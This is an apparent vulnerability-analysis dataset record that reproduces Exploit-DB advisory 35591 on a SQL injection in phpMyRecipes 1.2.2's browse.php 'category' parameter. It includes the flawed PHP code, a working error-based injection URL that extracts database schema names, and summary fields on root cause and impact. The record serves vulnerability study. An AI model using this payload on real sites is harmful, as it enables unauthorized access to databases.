```
[
  {
    "Content": "EDB-ID: 35591\nCVE: [2014-9440](https://nvd.nist.gov/vuln/detail/CVE-2014-9440)\nAuthor: Manish Tanwar\nType: webapps\nPlatform: PHP\nDate: 2014-12-23\n\nVulnerable App:\n```\n##################################################################################################\n#Exploit Title : phpMyRecipes 1.2.2 SQL injection(page browse.php, parameter category)\n#Author        : Manish Kishan Tanwar\n#Download Link : http://prdownloads.sourceforge.net/php-myrecipes/phpMyRecipes-1.2.2.tar.gz?download\n#Date          : 23/12/2014\n#Discovered at : IndiShell Lab\n# Love to      : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,jagriti\n# email        : manish.1046@gmail.com\n##################################################################################################\n\n////////////////////////\n/// Overview:\n////////////////////////\n\nphpMyRecipes is a simple application for storing and retrieving recipes.\nIt uses a web-based interface, for ease of use across any system, and a MySQL database backend for storing the recipes.\n///////////////////////////////\n// Vulnerability Description:\n///////////////////////////////\nvulnerability is due to parameter category in browse.php\nparameter category is passing to function GetCategoryNameByID without data filtering and due to it, SQL injection vulnerability is arising.\n\nfrom line 38 to 56\n\n    $category = $_GET['category'];\n  }\n\n  $session = getsession();\n\n  c_header(\"Browse Recipes\", \"browse\");\n\n  # Build a category string\n  $cat = $category;\n  $catstr = \"\";\n  while ($cat != 1) {\n    if ($catstr == \"\") {\n      $catstr = \"<A HREF=\\\"\" . slink(\"browse.php?category=$cat\") . \"\\\">\" . GetCategoryNameByID($cat) .  \"</A>\" . $catstr;\n    } else {\n      $catstr = \"<A HREF=\\\"\" . slink(\"browse.php?category=$cat\") . \"\\\">\" . GetCategoryNameByID($cat) .  \"</A> > \" . $catstr;\n    }\n\n    $cat = GetCategoryParentByID($cat);\n  }\n\n////////////////\n///  POC   ////\n///////////////\n\nPOC image=http://oi57.tinypic.com/inv3ol.jpg\n payload for extracting database name\n set value of category parameter to 1 and add error based SQL injection payload to url\n\nhttp://127.0.0.1/pr/browse.php?category=1 and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)\n\n                             --==[[ Greetz To ]]==--\n############################################################################################\n#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,\n#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,\n#Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,\n#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Das\n#############################################################################################\n                             --==[[Love to]]==--\n# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,\n#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Don(Deepika kaushik)\n                       --==[[ Special Fuck goes to ]]==--\n                            <3  suriya Cyber Tyson <3\n\n```",
    "Root cause of vulnerability": "The vulnerability is due to the `category` parameter in `browse.php` not being properly sanitized before being passed to the `GetCategoryNameByID` function.",
    "Weaknesses/vulnerabilities present": "SQL Injection vulnerability due to lack of input sanitization.",
    "Impact of exploitation": "An attacker can execute arbitrary SQL queries, potentially leading to data exfiltration, modification, or deletion.",
    "Attack vectors": "The attack vector is through the `category` parameter in the `browse.php` file.",
    "Required attacker capabilities/position": "The attacker needs to be able to send HTTP requests to the vulnerable web application and manipulate the `category` parameter. No specific position within the network is required."
  }
]
```